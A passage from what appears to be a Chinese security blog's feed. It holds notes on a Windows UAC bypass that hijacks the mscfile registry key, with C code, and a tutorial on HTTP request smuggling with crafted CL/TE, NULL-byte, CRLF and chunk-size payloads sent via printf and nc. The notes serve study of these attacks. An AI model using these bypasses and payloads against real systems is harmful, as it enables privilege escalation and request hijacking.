Files</strong>（x86和x64）目录或<strong>Windows</strong>目录</li><li>查看其他用户文件夹</li><li>配置文件共享或<a href="https://zh.wikipedia.org/wiki/流媒體">流媒体</a></li><li>配置家长控制面板</li><li>运行<a href="https://zh.wikipedia.org/wiki/微软管理控制台">Microsoft Management Console</a>控制台和以.msc为后缀名程序（部分.mmc程序除外）</li><li>运行<a href="https://zh.wikipedia.org/wiki/系統還原">系统还原</a>程序</li><li>运行<a href="https://zh.wikipedia.org/w/index.php?title=磁盤碎片整理&amp;action=edit&amp;redlink=1">磁盘碎片整理</a>程序</li><li>运行<a href="https://zh.wikipedia.org/w/index.php?title=註冊表編輯器&amp;action=edit&amp;redlink=1">注册表编辑器</a>或修改注册表</li><li>安装或卸载显示语言（Windows 7）</li><li>运行Windows评估程序</li><li>配置Windows电源程序，</li><li>配置Windows功能</li><li>运行日期和时间控制台</li><li>配置轻松访问</li><li>激活、修改产品密钥</li></ul></blockquote><p>在触发 UAC 时，操作系统会创建一个<code>consent.exe</code>进程，用来确定是否创建具有管理员权限的进程（通过白名单和用户选择判断），然后<code>CreateProcess</code>。请求进程将要请求的进程cmdline和进程路径，通过LPC接口传递给appinfo的<code>RAiLuanchAdminProcess</code>函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名，以及发起者的权限，是否符合要求，然后决定是否弹出UAC框，让用户确认。这个UAC框会创建新的安全桌面，遮挡之前的界面。同时这个UAC框进程是SYSTEM账户的进程，其他标准用户进程无法与其通信交互。用户确认之后，会调用<code>CreateProcessAsUser</code>函数，以管理员权限启动请求的进程。</p><p>UAC Bypass方法：</p><ul><li>白名单提权</li><li>COM组件接口技术</li></ul><h4 id="bypass-uac-白名单提权">Bypass UAC-白名单提权</h4><p>使用进程监控工具：<code>Procmon.exe</code>，监控<code>CompMgmtLauncher.exe</code></p><p><code>CompMgmtLauncher.exe</code>进程会先查询注册表<code>HKCU\Software\Classes\mscfile\shell\open\command</code>中的数据，发现该路路径不存在后，继续查询注册表<code>HKCR\mscfile\shell\open\command(Default)</code>中的数据并读取，该注册表路径中存储着mmc.exe进程的路径信息。</p><p>可以在<code>HKCU\Software\Classes\mscfile\shell\open\command(Default)</code>写入自定义路径，实现代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">setReg</span><span class="params">(<span class="keyword">char</span>* lpzEXEpath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HKEY hKey = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 创建项</span></span><br><span class="line">RegCreateKeyEx(HKEY_CURRENT_USER, (LPCWSTR)<span class="string">&quot;Software\\Classes\\mscfile\\Shell\\Open\\Command&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, KEY_WOW64_64KEY | KEY_ALL_ACCESS, <span class="literal">NULL</span>, &amp;hKey, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">// 设置键值</span></span><br><span class="line">RegSetValueEx(hKey, <span class="literal">NULL</span>, <span class="number">0</span>, REG_SZ, (BYTE*)lpzEXEpath, (<span class="number">1</span> + lstrlen((LPCWSTR)lpzEXEpath)));</span><br><span class="line"><span class="comment">// 关闭注册表</span></span><br><span class="line">RegCloseKey(hKey);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="隐藏技术">隐藏技术</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;p&gt;准备开个系列，就叫“Windows Program Learn”，记录《Windows黑客编程技术详解》书的代码和笔记。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;https://github.com/jash-git/Windows-Hack</summary>
      
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="Win32" scheme="https://ghostasky.github.io/tags/Win32/"/>
    
  </entry>
  
  <entry>
    <title>HTTP Smuggling攻击</title>
    <link href="https://ghostasky.github.io/2022/10/05/2022-10-HTTP/"/>
    <id>https://ghostasky.github.io/2022/10/05/2022-10-HTTP/</id>
    <published>2022-10-04T16:00:00.000Z</published>
    <updated>2022-10-09T15:47:42.057Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="timeline">TimeLine</h1><ul><li>2004年，<code>@Amit Klein</code> 提出 <a href="https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf">HTTP Response Splitting</a> 技术，雏形</li><li>2005年，<code>@Watchfire</code> 首次提出 <a href="https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf">HTTP Request Smuggling</a></li><li>2016 年 Defcon 24 ，<code>@regilero</code> 提出了 <a href="https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf">Hiding Wookiees In Http</a>，进一步揭示了 HTTP Smuggling 这种攻击方式。</li><li>2019 年 Defcon 27， <code>@James Kettle</code> 提出了 <a href="https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf">HTTP Desync Attacks: Smashing into the Cell Next Door</a>，讲解了如何用 HTTP Smuggling 技术挖掘到了 Paypal 的漏洞。</li></ul><p>参考<code>@regilero</code>博客：https://regilero.github.io/tag/Smuggling/</p><h1 id="http-connection">HTTP Connection</h1><p>在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，就需要同服务器建立一个TCP链接，导致服务器负载增大</p><p>在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><h2 id="keep-alive">Keep-Alive</h2><p>根据<code>RFC7230</code>在 <code>HTTP/1.1</code>中默认使用<code>Keep-Alive</code>，从而允许在单个连接上承载多个请求和响应。</p><p>所谓<code>Keep-Alive</code>就是在请求头中加：<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，有些请求会带<code>Connection: close</code>，通信完成后会关闭TCP链接</p><h2 id="pipeline">Pipeline</h2><p>在上面的<code>Keep-Alive</code>之后出现了<code>Pipeline</code>，也就是客户可以一直发请求，服务端接收到后存放到队列中处理。以下是是否使用<code>Pipeline</code>的对比：</p><figure><img src="/2022/10/05/2022-10-HTTP/20191017234109.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h1 id="message-body">Message Body</h1><p>RFC：https://tools.ietf.org/html/rfc7230#section-3.3</p><h2 id="transfer-encoding">Transfer-Encoding</h2><blockquote><p>Transfer-Encoding 类似于 MIME 的 Content-Transfer-Encoding 字段，旨在通过 7 位传输服务实现二进制数据的安全传输。 然而，安全传输对 8bit-clean 传输协议有不同的关注点。 在 HTTP 的情况下，Transfer-Encoding 的主要目的是准确界定动态生成的有效负载，并将仅用于传输效率或安全性的有效负载编码与作为所选资源特征的有效负载编码区分开来。</p></blockquote><p>MDN列举的几个属性，这里着重关注chunked：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>compress</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>deflate</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>gzip</span><br></pre></td></tr></table></figure><p>可以bypassWAF，见：<a href="https://www.freebuf.com/articles/web/194351.html">利用分块传输吊打所有WAF</a></p><p>分块传输的规范：<a href="https://www.rfc-editor.org/rfc/rfc7230#section-4.1">RFC7230</a></p><blockquote><p>The chunked transfer coding wraps the payload body in order to transfer it as a series of chunks, each with its own size indicator, followed by an OPTIONAL trailer containing header fields. Chunked enables content streams of unknown size to be transferred as a sequence of length-delimited buffers, which enables the sender to retain connection persistence and the recipient to know when it has received the entire message.</p><p>分块传输编码将有效负载主体包装起来，以便将其作为一系列块传输，每个块都有自己的大小指示符，后跟一个包含标题字段的可选尾部。 分块使未知大小的内容流能够作为一系列以长度分隔的缓冲区进行传输，这使发送者能够保持连接持久性，而接收者能够知道它何时收到了整个消息。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">chunked-body   = *chunk</span><br><span class="line">                 last-chunk</span><br><span class="line">                 trailer-part</span><br><span class="line">                 CRLF</span><br><span class="line"></span><br><span class="line">chunk          = chunk-size [ chunk-ext ] CRLF</span><br><span class="line">                 chunk-data CRLF</span><br><span class="line">chunk-size     = 1*HEXDIG</span><br><span class="line">last-chunk     = 1*(&quot;0&quot;) [ chunk-ext ] CRLF</span><br><span class="line"></span><br><span class="line">chunk-data     = 1*OCTET ; a sequence of chunk-size octets</span><br></pre></td></tr></table></figure><blockquote><p>chunk-size字段是一串十六进制数字，以八位字节表示块数据的大小。 当接收到一个块大小为零的块时，分块传输编码就完成了，可能后面跟着一个trailer，最后由一个空行终止。</p></blockquote><p>等等等等，，看文档去吧。。</p><p>如果想发送：<code>Wikipedia in\r\n\r\nchunks.</code></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POSTT</span> <span class="string">/xxx</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>xxx</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain </span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="taggerscript">4<span class="symbol">\r</span><span class="symbol">\n</span></span></span><br><span class="line"><span class="taggerscript">Wiki<span class="symbol">\r</span><span class="symbol">\n</span></span></span><br><span class="line"><span class="taggerscript">5<span class="symbol">\r</span><span class="symbol">\n</span></span></span><br><span class="line"><span class="taggerscript">pedia<span class="symbol">\r</span><span class="symbol">\n</span></span></span><br><span class="line"><span class="taggerscript">e<span class="symbol">\r</span><span class="symbol">\n</span></span></span><br><span class="line"><span class="taggerscript"> in<span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>chunks.<span class="symbol">\r</span><span class="symbol">\n</span></span></span><br><span class="line"><span class="taggerscript">0<span class="symbol">\r</span><span class="symbol">\n</span></span></span><br><span class="line"><span class="taggerscript"><span class="symbol">\r</span><span class="symbol">\n</span></span></span><br></pre></td></tr></table></figure><blockquote><p>第一个4表示接下来会有4字节数据(Wiki)，然后按照 RFC 文档标准，字母 Wiki 部分后面需要跟<code>\r\n</code>表示 chunk-data 部分，数字 4 后面需要跟<code>\r\n</code>表示 chunk-size 部分，注意这里的数字是16进制，比如见第三部分的e；最后的0\r\n\r\n表示chunk部分结束</p></blockquote><h1 id="background">Background</h1><blockquote><p>为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。</p></blockquote><p>引图：</p><p><img src="/2022/10/05/2022-10-HTTP/1570691716000-Topology.png"></p><blockquote><p>一般来说，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这也很容易理解，用户的分布范围是十分广泛，建立连接的时间也是不确定的，这样TCP链接就很难重用，而代理服务器与后端的源站服务器的IP地址是相对固定，不同用户的请求通过代理服务器与源站服务器建立链接，这两者之间的TCP链接进行重用，也就顺理成章了。</p><p>当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p></blockquote><p>也就是两者的解析差异</p><h1 id="attack-method">Attack Method</h1><h2 id="优先级">优先级</h2><p><code>Content-Length</code> 与 <code>Transfer-Encoding</code> 均可以作为 POST 数据传输时处理 body 的方式，为了方便：</p><blockquote><p>Front 代表的是反向代理等典型的前端服务器，Backend 代表的是处理请求的后端业务服务器</p></blockquote><ul><li>CL-TE 代表 Front 以 <code>Content-Length</code> 优先处理，Backend 以 <code>Transfer-Encoding</code> 优先处理</li><li>TE-CL 代表 Front 以 <code>Transfer-Encoding</code> 优先处理，Backend 以 <code>Content-Length</code> 优先处理</li></ul><p>上述情况下，后端服务器为一台时的架构类似：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|               |               |</span><br><span class="line">|------A-------&gt;|               | </span><br><span class="line">|               |-------A------&gt;| </span><br><span class="line">|               |&lt;-A(200)-------|</span><br><span class="line">|&lt;-A(200)-------|               |</span><br></pre></td></tr></table></figure><p>其实CL与TE是在RFC中规定了优先级的，TE优先级高于CL。但还是可以通过一些方法绕过。</p><p>eg：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">printf </span><br><span class="line"><span class="string">&#x27;GET / HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host:localhost\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Content-length:56\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Transfer-Encoding: chunked\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Dummy:Header\r\n\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;0\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET /tmp HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host:localhost\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Dummy:Header\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET /tests HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host:localhost\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Dummy:Header\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line">| nc -q3 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><p>正常情况下应该是3个请求</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:localhost</span><br><span class="line">Content-length:56</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line">Dummy:Header</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tmp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:localhost</span><br><span class="line">Dummy:Header</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tests</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:localhost</span><br><span class="line">Dummy:Header</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果存在TE&amp;CL优先级的话会被解析为两个请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1[CRLF]</span><br><span class="line">Host:localhost[CRLF]</span><br><span class="line">Content-length:56[CRLF]</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked[CRLF] (ignored and removed, hopefully)</span><br><span class="line">Dummy:Header[CRLF]</span><br><span class="line">[CRLF]</span><br><span class="line">0[CRLF]  (start of 56 bytes of body)</span><br><span class="line">[CRLF]</span><br><span class="line">GET /tmp HTTP/1.1[CRLF]</span><br><span class="line">Host:localhost[CRLF]</span><br><span class="line">Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/tests</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">Host:localhost</span><br><span class="line">Dummy:Header</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="bad-chunked-transimission">Bad chunked Transimission</h2><p><a href="https://www.rfc-editor.org/rfc/rfc7230#section-3.3.3">RFC7230 3.3.3</a>：</p><blockquote><p>如果请求中存在 Transfer-Encoding 头字段，并且分块传输编码不是最终编码，则无法可靠地确定消息体长度； 服务器必须响应 400（Bad Request）状态码，然后关闭连接。</p></blockquote><p>也就是说收到<code>Transfer-Encoding: chunked, zorg</code>的时候，要返回400</p><p>但是有很多绕过：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>xchunked</span><br><span class="line"></span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>x</span><br><span class="line"></span><br><span class="line">Transfer-Encoding:[tab]chunked</span><br><span class="line"></span><br><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"> Transfer-Encoding: chunked</span><br><span class="line"><span class="attribute">X</span><span class="punctuation">: </span>X[\n]Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line"><span class="ada">Transfer-Encoding</span></span><br><span class="line"><span class="ada"> : <span class="type">chunked</span></span></span><br></pre></td></tr></table></figure><h2 id="null-in-header">NULL in header</h2><p>在一些用C写的中间件会容易产生这个问题，比如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)</span><br><span class="line">printf &#x27;GET / HTTP/1.1\r\n&#x27;\</span><br><span class="line">&#x27;Host:localhost\r\n&#x27;\</span><br><span class="line">&#x27;Content-\0dummy: foo\r\n&#x27;\</span><br><span class="line">&#x27;length: 56\r\n&#x27;\</span><br><span class="line">&#x27;Transfer-Encoding: chunked\r\n&#x27;\</span><br><span class="line">&#x27;Dummy:Header\r\n&#x27;\</span><br><span class="line">&#x27;\r\n&#x27;\</span><br><span class="line">&#x27;0\r\n&#x27;\</span><br><span class="line">&#x27;\r\n&#x27;\</span><br><span class="line">&#x27;GET /tmp HTTP/1.1\r\n&#x27;\</span><br><span class="line">&#x27;Host:localhost\r\n&#x27;\</span><br><span class="line">&#x27;Dummy:Header\r\n&#x27;\</span><br><span class="line">&#x27;\r\n&#x27;\</span><br><span class="line">&#x27;GET /tests HTTP/1.1\r\n&#x27;\</span><br><span class="line">&#x27;Host:localhost\r\n&#x27;\</span><br><span class="line">&#x27;Dummy:Header\r\n&#x27;\</span><br><span class="line">&#x27;\r\n&#x27;\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有些中间件处理以上的请求时，当遇到<code>\0</code>的时候会继续换行读取，这样也会导致产生解析差异。</p><h2 id="crlf">CRLF</h2><p>RFC3.5：</p><blockquote><p>尽管起始行和标题字段的行终止符是序列 CRLF，但接收者可以将单个 LF 识别为行终止符并忽略任何前面的 CR。</p></blockquote><p>也就是说可以直接使用LF作为EOL，在NodeJs&lt;5.6.0中，是这样处理的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[CR] + ? == [CR][LF]//true</span><br></pre></td></tr></table></figure><p>假设我们有一个正常解析 CRLF 的 Front 服务器，后端是有该漏洞的 Node.js 服务，我们可以发送以下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host:localhost\r\n</span><br><span class="line"><span class="attribute">Dummy</span><span class="punctuation">: </span>Header\rZTransfer-Encoding: chunked\r\n</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>52\r\n</span><br><span class="line">\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /tmp HTTP/1.1\r\n</span><br><span class="line">Host:localhost\r\n</span><br><span class="line">Dummy:Header\r\n</span><br></pre></td></tr></table></figure><p>Front服务器会认为<code>Dummy: Header\rZTransfer-Encoding: chunked\r\n</code>是一个请求头，而后端NodeJs服务器会认为<code>\rZ</code>是一个换行，按照TE&gt;CL，会认为这是两个请求。</p><h2 id="size-issue">Size Issue</h2><p>有些中间件在解析快大小的时候会对块长度进行长度截断，比如：`<code>0000000000000000000000000000042</code>只取<code>00000000000000000</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&#x27;GET / HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host:localhost\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Transfer-Encoding: chunked\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Dummy:Header\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;0000000000000000000000000000042\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;GET /tmp/ HTTP/1.1\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Host:localhost\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;Transfer-Encoding: chunked\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;0\r\n&#x27;</span>\</span><br><span class="line"><span class="string">&#x27;\r\n&#x27;</span>\</span><br><span class="line">| nc -q3 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><h2 id="http-version">Http version</h2><p>主要是http0.9，先看下其他版本的例子：</p><p>HTTPv1.1:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br></pre></td></tr></table></figure><p>HTTPv1.0:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /foo HTTP/1.0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>HTTPv0.9:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /foo\r\n</span><br></pre></td></tr></table></figure><p>HTTPv0.9中的请求包与响应包中是没有headers的概念的，body部分就是<code>text stream</code>。</p><p>例子：</p><p><img src="/2022/10/05/2022-10-HTTP/20191130143300.png"></p><p>上图的HTTP/0.9并不是v0.9的标准格式，一些中间件已经不能直接解析标准格式了，但是还可能解析上面的格式，于是：</p><figure><img src="/2022/10/05/2022-10-HTTP/20191130143557.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/2022/10/05/2022-10-HTTP/20191130143626.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><p>上面两图是大致攻击流程，chewy2.jpg 当中的 24-33664 字节有着一个完整的 HTTP 响应报文，当 Golang 在处理 HTTP/0.9 的时候，获取响应报文的 24-33664 个字节，也就是获取了我们存放在图片当中的 HTTP 报文，然后返回给 Golang ，Golang 对于 HTTP/0.9 再进行标准化去头的处理，这样响应看起来就是一个新的响应了。</p><h2 id="has-a-cl-in-get">Has a CL in GET</h2><p>在 GET 请求中使用了 body ，并以 Content-Length 指出了 body 的长度</p><p>RFC7230的content-length部分：</p><blockquote><p>例如，通常在 POST 请求中发送 Content-Length 标头字段，即使该值为 0（表示有效负载正文为空）。 当请求消息不包含有效负载主体并且方法语义不预期这样的主体时，用户代理不应发送 Content-Length 标头字段。</p></blockquote><p>在最新的4.3.1中：</p><blockquote><p>GET 请求消息中的有效负载没有定义的语义； 在 GET 请求上发送有效负载正文可能会导致某些现有实现拒绝该请求。</p></blockquote><p>但是对于有body字段，并且Content-Length指出其长度的请求，RFC中并没有说服务器改如何处理，所以这些中间件并没有标准的处理流程，会有不同的解析差异，导致http请求走私攻击。</p><p>比如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>41\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>Front处理的时候会当做一个完整的请求给Backend，Backend在处理这个请求的时候会当做两个请求。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /secret HTTP/1.1\r\n--&gt;&quot;GET /secret HTTP/1.1&quot; 一共20个字符，加上CRLF一共22个字符</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n--&gt;&quot;Host: example.com&quot; 一共17个字符，加上CRLF一共19个字符</span><br></pre></td></tr></table></figure><p>19+22=41</p><h2 id="two-identical-fields---cl">Two Identical Fields - 